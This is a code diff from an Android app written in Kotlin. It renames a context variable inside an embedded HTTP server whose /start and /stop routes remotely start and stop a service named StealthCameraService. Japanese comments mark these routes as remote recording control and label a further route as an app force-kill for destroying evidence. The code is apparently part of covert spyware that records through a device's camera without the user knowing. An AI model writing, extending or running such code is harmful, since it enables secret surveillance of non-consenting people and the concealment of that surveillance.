@@ -14,7 +14,7 @@ import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import kotlin.system.exitProcess
 
-class EmbeddedServer(private val context: Context) {
+class EmbeddedServer(private val appContext: Context) {
     private var server: NettyApplicationEngine? = null
 
     fun start() {
@@ -27,14 +27,14 @@ class EmbeddedServer(private val context: Context) {
                     }
                     // 遠隔：録画開始
                     get("/start") {
-                        val intent = Intent(context, StealthCameraService::class.java)
-                        context.startService(intent)
+                        val intent = Intent(appContext, StealthCameraService::class.java)
+                        appContext.startService(intent)
                         call.respondText("Recording started via remote")
                     }
                     // 遠隔：録画停止
                     get("/stop") {
-                        val intent = Intent(context, StealthCameraService::class.java)
-                        context.stopService(intent)
+                        val intent = Intent(appContext, StealthCameraService::class.java)
+                        appContext.stopService(intent)
                         call.respondText("Recording stopped via remote")
                     }
                     // 遠隔：アプリ強制キル（証拠隠滅・タスクキル）
